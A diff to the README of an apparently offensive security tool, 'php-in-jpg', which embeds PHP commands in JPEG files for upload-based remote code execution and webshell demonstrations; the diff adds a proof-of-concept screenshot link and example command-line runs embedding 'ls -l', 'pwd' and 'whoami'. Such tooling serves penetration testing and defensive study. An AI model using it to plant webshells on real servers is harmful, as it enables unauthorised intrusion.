@@ -10,6 +10,8 @@ By default, the payload uses the **GET-based execution mode** (`?cmd=your_comman
 
 This tool is designed to support **PHP RCE polyglot techniques**, often used in upload-based exploitation scenarios or webshell demonstrations.
 
+![PoC demo](screenshots/poc.png)
+
 ---
 
 ## 🛠️ Features
@@ -59,6 +61,28 @@ python php-in-jpg.py -m inline -c fixed -x "ls -l" --show-payload
 
 ---
 
+### 💻 Example CLI Output
+
+```
+$ python php-in-jpg.py -m inline -c fixed -x "ls -l"
+[+] File generated: jpg_poc_fixed_inline_20250408_134033.php.jpg
+[!] Embedded command: ls -l
+
+$ python php-in-jpg.py -m inline -c fixed -x "ls -l" -t wrong_path
+[-] Error: template file not found at: wrong_path
+
+$ python php-in-jpg.py -m inline -c fixed -x "pwd" -t template/custom.tpl -o output.php
+[+] File generated: output.php
+[!] Embedded command: pwd
+
+$ python php-in-jpg.py -m metadata -c fixed -x "whoami" -o output.php
+    1 image files updated
+[+] File generated: output.php
+[!] Embedded command: whoami
+```
+
+---
+
 ## 📁 Template system
 
 Templates must contain the following placeholders:
@@ -72,7 +96,7 @@ A default template is located in: `template/default.tpl`
 
 ## 🔧 Requirements
 
-- Python 3.8+
+- Python 3
 - Python dependencies: install via `pip install -r requirements.txt`
 - `exiftool` (external tool, used for metadata injection)
 
